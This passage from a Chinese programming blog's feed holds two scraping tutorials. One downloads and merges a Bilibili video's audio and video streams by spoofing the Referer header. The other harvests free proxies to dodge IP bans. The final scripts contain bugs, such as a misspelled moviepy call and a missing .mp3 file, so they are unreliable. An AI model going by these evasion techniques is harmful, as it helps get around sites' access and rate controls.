      <url>/2021/11/12/%E5%AF%B9B%E7%AB%99%E8%A7%86%E9%A2%91%E7%88%AC%E5%8F%96%E4%B8%8B%E8%BD%BD%EF%BC%8C%E5%B9%B6%E7%BB%84%E5%90%88%E6%88%90%E5%AE%8C%E6%95%B4%E7%9A%84%E8%A7%86%E9%A2%91/</url>
      
        <content type="html"><![CDATA[<p>平时没事的时候除了刷抖音还喜欢逛B站，但在B站看见有趣的视频时候想要下载下来，却发现没有下载的按钮，人生是一个发现困难并且解决困难的过程，既然你不让我下，那我就非得下，爬虫可见及可爬，那我就用爬虫给你爬下来，</p><span id="more"></span><p>有请受害者B站排行榜舞蹈区排名第一：<a href="https://www.bilibili.com/video/BV1c341187m9">https://www.bilibili.com/video/BV1c341187m9</a></p><p>先分析一波：打开检查抓一下包，因为视频是异步加载的所以抓xhr的数据，清空数据包再将视频打开，发现多了不少数据包，但哪些是我们需要的数据呢，先看一下有什么特殊的数据，我们知道，视频是比较大的并且B站的视频是音频分离的，所以我们要找两个数据包，一个是视频一个是音频，</p><p><img src="/2021/11/12/%E5%AF%B9B%E7%AB%99%E8%A7%86%E9%A2%91%E7%88%AC%E5%8F%96%E4%B8%8B%E8%BD%BD%EF%BC%8C%E5%B9%B6%E7%BB%84%E5%90%88%E6%88%90%E5%AE%8C%E6%95%B4%E7%9A%84%E8%A7%86%E9%A2%91/1.jpg"></p><p>发现抓到了很多带有一堆数字的数据包，而且有的还不一样，返回的东西看不懂，仔细看一下url，发现里面有没见过的后缀名.m4s，查了一下发现M4S属于HTML5播放格式，可以为视频、也可以为音频，如此历来视频的数据包就找到了，这里有两种数据包，一个是后缀名前是30077的，一个是30280的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://xy221x131x191x56xy.mcdn.bilivideo.cn:4483/upgcxcode/95/78/439527895/439527895-1-30077.m4s?e=ig8euxZM2rNcNbdlhoNvNC8BqJIzNbfqXBvEqxTEto8BTrNvN0GvT90W5JZMkX_YN0MvXg8gNEV4NC8xNEV4N03eN0B5tZlqNxTEto8BTrNvNeZVuJ10Kj_g2UB02J0mN0B5tZlqNCNEto8BTrNvNC7MTX502C8f2jmMQJ6mqF2fka1mqx6gqj0eN0B599M=&amp;uipk=5&amp;nbs=1&amp;deadline=1636727944&amp;gen=playurlv2&amp;os=mcdn&amp;oi=3748183839&amp;trid=00015abe094f6dc94938917e8895505bead4u&amp;platform=pc&amp;upsig=df692a5e07e5ceb77c354bf38dea609f&amp;uparams=e,uipk,nbs,deadline,gen,os,oi,trid,platform&amp;mcdnid=9001331&amp;mid=671157361&amp;bvc=vod&amp;nettype=0&amp;orderid=0,3&amp;agrr=0&amp;bw=181576&amp;logo=A0000100</span><br><span class="line"></span><br><span class="line">https://xy221x131x191x56xy.mcdn.bilivideo.cn:4483/upgcxcode/95/78/439527895/439527895_nb2-1-30280.m4s?e=ig8euxZM2rNcNbdlhoNvNC8BqJIzNbfqXBvEqxTEto8BTrNvN0GvT90W5JZMkX_YN0MvXg8gNEV4NC8xNEV4N03eN0B5tZlqNxTEto8BTrNvNeZVuJ10Kj_g2UB02J0mN0B5tZlqNCNEto8BTrNvNC7MTX502C8f2jmMQJ6mqF2fka1mqx6gqj0eN0B599M=&amp;uipk=5&amp;nbs=1&amp;deadline=1636727944&amp;gen=playurlv2&amp;os=mcdn&amp;oi=3748183839&amp;trid=00015abe094f6dc94938917e8895505bead4u&amp;platform=pc&amp;upsig=f9b8eb9e4545f2d0d244804b9e65e780&amp;uparams=e,uipk,nbs,deadline,gen,os,oi,trid,platform&amp;mcdnid=9001331&amp;mid=671157361&amp;bvc=vod&amp;nettype=0&amp;orderid=0,3&amp;agrr=0&amp;bw=40218&amp;logo=A0000100</span><br></pre></td></tr></table></figure><p>既然找到了数据包就对这两个url进行请求，不过这种请求一般设有<strong>防盗链</strong>，就是检查你从哪个地址跳转过来的，我们要在headers里设置<strong>referer</strong>。<strong>referer</strong>的获取方法和获取<strong>user-agent</strong>的方法一样，不过这个<strong>referer</strong>要在你所要<strong>请求的数据包</strong>里找</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">def get_page(url_30280, url_30077, headers):</span><br><span class="line">    response1 = requests.get(url_30280, headers=headers).content</span><br><span class="line">    response2 = requests.get(url_30077, headers=headers).content</span><br><span class="line">    # print(response1,response2)</span><br><span class="line">    with open(&#x27;B站视频1.mp4&#x27;, &#x27;wb&#x27;) as f:</span><br><span class="line">        f.write(response1)</span><br><span class="line">    with open(&#x27;B站视频2.mp4&#x27;, &#x27;wb&#x27;) as f:</span><br><span class="line">        f.write(response2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    url_30280 = &#x27;https://xy221x131x191x56xy.mcdn.bilivideo.cn:4483/upgcxcode/95/78/439527895/439527895_nb2-1-30280.m4s?e=ig8euxZM2rNcNbdlhoNvNC8BqJIzNbfqXBvEqxTEto8BTrNvN0GvT90W5JZMkX_YN0MvXg8gNEV4NC8xNEV4N03eN0B5tZlqNxTEto8BTrNvNeZVuJ10Kj_g2UB02J0mN0B5tZlqNCNEto8BTrNvNC7MTX502C8f2jmMQJ6mqF2fka1mqx6gqj0eN0B599M=&amp;uipk=5&amp;nbs=1&amp;deadline=1636727944&amp;gen=playurlv2&amp;os=mcdn&amp;oi=3748183839&amp;trid=00015abe094f6dc94938917e8895505bead4u&amp;platform=pc&amp;upsig=f9b8eb9e4545f2d0d244804b9e65e780&amp;uparams=e,uipk,nbs,deadline,gen,os,oi,trid,platform&amp;mcdnid=9001331&amp;mid=671157361&amp;bvc=vod&amp;nettype=0&amp;orderid=0,3&amp;agrr=0&amp;bw=40218&amp;logo=A0000100&#x27;</span><br><span class="line">    url_30077 = &#x27;https://xy221x131x191x56xy.mcdn.bilivideo.cn:4483/upgcxcode/95/78/439527895/439527895-1-30077.m4s?e=ig8euxZM2rNcNbdlhoNvNC8BqJIzNbfqXBvEqxTEto8BTrNvN0GvT90W5JZMkX_YN0MvXg8gNEV4NC8xNEV4N03eN0B5tZlqNxTEto8BTrNvNeZVuJ10Kj_g2UB02J0mN0B5tZlqNCNEto8BTrNvNC7MTX502C8f2jmMQJ6mqF2fka1mqx6gqj0eN0B599M=&amp;uipk=5&amp;nbs=1&amp;deadline=1636727944&amp;gen=playurlv2&amp;os=mcdn&amp;oi=3748183839&amp;trid=00015abe094f6dc94938917e8895505bead4u&amp;platform=pc&amp;upsig=df692a5e07e5ceb77c354bf38dea609f&amp;uparams=e,uipk,nbs,deadline,gen,os,oi,trid,platform&amp;mcdnid=9001331&amp;mid=671157361&amp;bvc=vod&amp;nettype=0&amp;orderid=0,3&amp;agrr=0&amp;bw=181576&amp;logo=A0000100&#x27;</span><br><span class="line">    header = &#123;</span><br><span class="line">        &#x27;referer&#x27;: &#x27;https://www.bilibili.com/video/BV1c341187m9&#x27;,</span><br><span class="line">        &#x27;user-agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">    get_page(url_30280, url_30077, header)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>运行一下就将两个数据包的内容获取到了，打开后发现视频一是纯音乐文件，视频二是纯视频文件</p><p>将音乐文件后缀名改成mp3</p><p>接下来就要把这两个文件合并起来，利用moviepy这个模块就可以合成一个完整的文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入纯视频文件</span></span><br><span class="line">video = VideoFileClip(<span class="string">&#x27;B站视频2.mp4&#x27;</span>)</span><br><span class="line"><span class="comment"># 导入纯音乐文件</span></span><br><span class="line">audio = AudioFileClip(<span class="string">&#x27;B站视频1.mp3&#x27;</span>)</span><br><span class="line"><span class="comment"># 将视频文件中加入音乐文件</span></span><br><span class="line">movie = video.set_audio(audio)</span><br><span class="line"><span class="comment"># 生成视频文件</span></span><br><span class="line">movie.write_videofile(<span class="string">&#x27;B站视频.mp4&#x27;</span>)</span><br></pre></td></tr></table></figure><p>运行后打开新生成的文件就可以观看带有声音的视频了</p><p>完整代码如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from moviepy.editor import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_page(url_30280, url_30077, headers):</span><br><span class="line">    response1 = requests.get(url_30280, headers=headers).content</span><br><span class="line">    response2 = requests.get(url_30077, headers=headers).content</span><br><span class="line">    # print(response1,response2)</span><br><span class="line">    with open(&#x27;B站视频1.mp4&#x27;, &#x27;wb&#x27;) as f:</span><br><span class="line">        f.write(response1)</span><br><span class="line">    with open(&#x27;B站视频2.mp4&#x27;, &#x27;wb&#x27;) as f:</span><br><span class="line">        f.write(response2)</span><br><span class="line">    # 导入纯视频文件</span><br><span class="line">    video = VideoFileClip(&#x27;B站视频2.mp4&#x27;)</span><br><span class="line">    # 导入纯音乐文件</span><br><span class="line">    audio = AudioFileClip(&#x27;B站视频1.mp3&#x27;)</span><br><span class="line">    # 将视频文件中加入音乐文件</span><br><span class="line">    movie = video.set_audio(audio)</span><br><span class="line">    #</span><br><span class="line">    movie.weite_videofile(&#x27;B站视频.mp4&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    url_30280 = &#x27;https://xy221x131x191x56xy.mcdn.bilivideo.cn:4483/upgcxcode/95/78/439527895/439527895_nb2-1-30280.m4s?e=ig8euxZM2rNcNbdlhoNvNC8BqJIzNbfqXBvEqxTEto8BTrNvN0GvT90W5JZMkX_YN0MvXg8gNEV4NC8xNEV4N03eN0B5tZlqNxTEto8BTrNvNeZVuJ10Kj_g2UB02J0mN0B5tZlqNCNEto8BTrNvNC7MTX502C8f2jmMQJ6mqF2fka1mqx6gqj0eN0B599M=&amp;uipk=5&amp;nbs=1&amp;deadline=1636727944&amp;gen=playurlv2&amp;os=mcdn&amp;oi=3748183839&amp;trid=00015abe094f6dc94938917e8895505bead4u&amp;platform=pc&amp;upsig=f9b8eb9e4545f2d0d244804b9e65e780&amp;uparams=e,uipk,nbs,deadline,gen,os,oi,trid,platform&amp;mcdnid=9001331&amp;mid=671157361&amp;bvc=vod&amp;nettype=0&amp;orderid=0,3&amp;agrr=0&amp;bw=40218&amp;logo=A0000100&#x27;</span><br><span class="line">    url_30077 = &#x27;https://xy221x131x191x56xy.mcdn.bilivideo.cn:4483/upgcxcode/95/78/439527895/439527895-1-30077.m4s?e=ig8euxZM2rNcNbdlhoNvNC8BqJIzNbfqXBvEqxTEto8BTrNvN0GvT90W5JZMkX_YN0MvXg8gNEV4NC8xNEV4N03eN0B5tZlqNxTEto8BTrNvNeZVuJ10Kj_g2UB02J0mN0B5tZlqNCNEto8BTrNvNC7MTX502C8f2jmMQJ6mqF2fka1mqx6gqj0eN0B599M=&amp;uipk=5&amp;nbs=1&amp;deadline=1636727944&amp;gen=playurlv2&amp;os=mcdn&amp;oi=3748183839&amp;trid=00015abe094f6dc94938917e8895505bead4u&amp;platform=pc&amp;upsig=df692a5e07e5ceb77c354bf38dea609f&amp;uparams=e,uipk,nbs,deadline,gen,os,oi,trid,platform&amp;mcdnid=9001331&amp;mid=671157361&amp;bvc=vod&amp;nettype=0&amp;orderid=0,3&amp;agrr=0&amp;bw=181576&amp;logo=A0000100&#x27;</span><br><span class="line">    header = &#123;</span><br><span class="line">        &#x27;referer&#x27;: &#x27;https://www.bilibili.com/video/BV1c341187m9&#x27;,</span><br><span class="line">        &#x27;user-agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">    get_page(url_30280, url_30077, header)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>免费搭建一个自己的代理ip池</title>
      <link href="/2021/10/22/%E5%85%8D%E8%B4%B9%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%BB%A3%E7%90%86ip%E6%B1%A0/"/>
      <url>/2021/10/22/%E5%85%8D%E8%B4%B9%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%BB%A3%E7%90%86ip%E6%B1%A0/</url>
      
        <content type="html"><![CDATA[<p>之前教给大家怎样爬取彼岸网美女图片，不知道有多少小伙伴没有忍住多爬了几张图片导致自己的ip被封呢<br>这里教大家怎样搭建ip池，妈妈再也不我的ip被封了</p><span id="more"></span><p>首先有请今天的受害对象<br>快代理:<a href="http://www.xiladaili.com/">http://www.xiladaili.com/</a><br>简单分析一下，我们要其中的ip以及端口号port这两个数据，而这每个数据前面都有自己特有的data-title，也就是说可以用re来匹配，确定了用什么模块来解析数据，那就开干!</p><p><img src="/2021/10/22/%E5%85%8D%E8%B4%B9%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%BB%A3%E7%90%86ip%E6%B1%A0/1.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_page</span>(<span class="params">url, headers</span>):</span><br><span class="line">    response = requests.get(url, headers=headers)</span><br><span class="line">    response.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">return</span> response.text</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">5</span>):</span><br><span class="line">        url = <span class="string">f&#x27;https://www.kuaidaili.com/free/inha/<span class="subst">&#123;i&#125;</span>/&#x27;</span></span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Fiddler/5.0.20204.45441 (.NET 4.8; WinNT 10.0.19042.0; zh-CN; 8xAMD64; Auto Update; Full Instance; Extensions: APITesting, AutoSaveExt, EventLog, FiddlerOrchestraAddon, HostsFile, RulesTab2, SAZClipboardFactory, SimpleFilter, Timeline)&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        html = get_page(url, headers)</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>因为我们爬取的是免费的代理，免费代理的存活率很低，所以要用爬取大量数据来保障我们的有效代理的数量，这里我们进行翻页处理，</p><p>这个网站的第二页 第三页的地址为：</p><p><a href="https://www.kuaidaili.com/free/inha/2/">https://www.kuaidaili.com/free/inha/2/</a></p><p><a href="https://www.kuaidaili.com/free/inha/3/">https://www.kuaidaili.com/free/inha/3/</a></p><p>可以看到是后面的数字改变了，把数字换成1，网页也可以访问成功，那么就可以用for循环来改变地址后面的数字，以达到翻页的效果，如上面的代码所示</p><p>获取到网页信息后用re模块来匹配我们想要的数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">analysis</span>(<span class="params">html</span>):</span><br><span class="line">    agent = []</span><br><span class="line">    pattern_ip = re.<span class="built_in">compile</span>(<span class="string">&#x27;&lt;td data-title=&quot;IP&quot;&gt;(.*?)&lt;/td&gt;&#x27;</span>)</span><br><span class="line">    pattern_port = re.<span class="built_in">compile</span>(<span class="string">&#x27;&lt;td data-title=&quot;PORT&quot;&gt;(.*?)&lt;/td&gt;&#x27;</span>)</span><br><span class="line">    ip_list = re.findall(pattern_ip, html)</span><br><span class="line">    port_list = re.findall(pattern_port, html)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ip_list) - <span class="number">1</span>):</span><br><span class="line">        age = ip_list[i] + <span class="string">&#x27;:&#x27;</span> + port_list[i]</span><br><span class="line">        agent.append(age)</span><br><span class="line">    <span class="keyword">return</span> agent</span><br></pre></td></tr></table></figure><p>用两次正则分别来匹配数据，在用for循环将这两个数据用 ： 来连接</p><img src="/2021/10/22/%E5%85%8D%E8%B4%B9%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%BB%A3%E7%90%86ip%E6%B1%A0/2.png" style="zoom:50%;"><p>最后再检测一下这些ip是否可用，可以用这个网站来测试：<a href="http://www.whatismyip.com.tw/">http://www.whatismyip.com.tw/</a></p><p>他会返回访问所用的ip地址，为了更直观的看到结果。我用了命令行特殊显示效果\033，以及将得到的页面打印出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">tes</span>(<span class="params">agent</span>):</span><br><span class="line">    url = <span class="string">&#x27;http://www.whatismyip.com.tw/&#x27;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Fiddler/5.0.20204.45441 (.NET 4.8; WinNT 10.0.19042.0; zh-CN; 8xAMD64; Auto Update; Full Instance; Extensions: APITesting, AutoSaveExt, EventLog, FiddlerOrchestraAddon, HostsFile, RulesTab2, SAZClipboardFactory, SimpleFilter, Timeline)&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> agent:</span><br><span class="line">        proxies = &#123;</span><br><span class="line">            <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://&#x27;</span> + i</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(url, headers=headers, proxies=proxies)</span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                <span class="built_in">print</span>(i, <span class="string">&#x27;\033[32m可用\033[0m&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(response.text)</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;ip.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(i + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(i, <span class="string">&#x27;\033[31m不可用\033[0m&#x27;</span>)</span><br></pre></td></tr></table></figure><p>代理的http和https设置一定要和所访问地址的http相同，不然会无法使用代理，直接用你自己的ip进行访问</p><p>程序运行后得到可用的ip， 可以看到网页检测到的ip和我们使用的ip相同</p><p><img src="/2021/10/22/%E5%85%8D%E8%B4%B9%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%BB%A3%E7%90%86ip%E6%B1%A0/4.png"></p><p>全部代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_page</span>(<span class="params">url, headers</span>):</span><br><span class="line">    response = requests.get(url, headers=headers)</span><br><span class="line">    response.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">return</span> response.text</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">analysis</span>(<span class="params">html</span>):</span><br><span class="line">    agent = []</span><br><span class="line">    pattern_ip = re.<span class="built_in">compile</span>(<span class="string">&#x27;&lt;td data-title=&quot;IP&quot;&gt;(.*?)&lt;/td&gt;&#x27;</span>)</span><br><span class="line">    pattern_port = re.<span class="built_in">compile</span>(<span class="string">&#x27;&lt;td data-title=&quot;PORT&quot;&gt;(.*?)&lt;/td&gt;&#x27;</span>)</span><br><span class="line">    ip_list = re.findall(pattern_ip, html)</span><br><span class="line">    port_list = re.findall(pattern_port, html)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ip_list) - <span class="number">1</span>):</span><br><span class="line">        age = ip_list[i] + <span class="string">&#x27;:&#x27;</span> + port_list[i]</span><br><span class="line">        agent.append(age)</span><br><span class="line">    <span class="built_in">print</span>(agent)</span><br><span class="line">    <span class="keyword">return</span> agent</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tes</span>(<span class="params">agent</span>):</span><br><span class="line">    url = <span class="string">&#x27;http://www.whatismyip.com.tw/&#x27;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Fiddler/5.0.20204.45441 (.NET 4.8; WinNT 10.0.19042.0; zh-CN; 8xAMD64; Auto Update; Full Instance; Extensions: APITesting, AutoSaveExt, EventLog, FiddlerOrchestraAddon, HostsFile, RulesTab2, SAZClipboardFactory, SimpleFilter, Timeline)&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> agent:</span><br><span class="line">        proxies = &#123;</span><br><span class="line">            <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://&#x27;</span> + i</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(url, headers=headers, proxies=proxies)</span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                <span class="built_in">print</span>(i, <span class="string">&#x27;\033[32m可用\033[0m&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(response.text)</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;ip.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(i + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(i, <span class="string">&#x27;\033[31m不可用\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">5</span>):</span><br><span class="line">        url = <span class="string">f&#x27;https://www.kuaidaili.com/free/inha/<span class="subst">&#123;i&#125;</span>/&#x27;</span></span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Fiddler/5.0.20204.45441 (.NET 4.8; WinNT 10.0.19042.0; zh-CN; 8xAMD64; Auto Update; Full Instance; Extensions: APITesting, AutoSaveExt, EventLog, FiddlerOrchestraAddon, HostsFile, RulesTab2, SAZClipboardFactory, SimpleFilter, Timeline)&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        html = get_page(url, headers)</span><br><span class="line">        <span class="comment"># print(html)</span></span><br><span class="line">        agent = analysis(html)</span><br><span class="line">        tes(agent)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 代理ip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>程序员的浪漫——教你表白，让你的女神不会拒绝</title>
      <link href="/2021/10/13/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E6%B5%AA%E6%BC%AB%E2%80%94%E2%80%94%E6%95%99%E4%BD%A0%E8%A1%A8%E7%99%BD%EF%BC%8C%E8%AE%A9%E4%BD%A0%E7%9A%84%E5%A5%B3%E7%A5%9E%E4%B8%8D%E4%BC%9A%E6%8B%92%E7%BB%9D/"/>
      <url>/2021/10/13/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E6%B5%AA%E6%BC%AB%E2%80%94%E2%80%94%E6%95%99%E4%BD%A0%E8%A1%A8%E7%99%BD%EF%BC%8C%E8%AE%A9%E4%BD%A0%E7%9A%84%E5%A5%B3%E7%A5%9E%E4%B8%8D%E4%BC%9A%E6%8B%92%E7%BB%9D/</url>
      
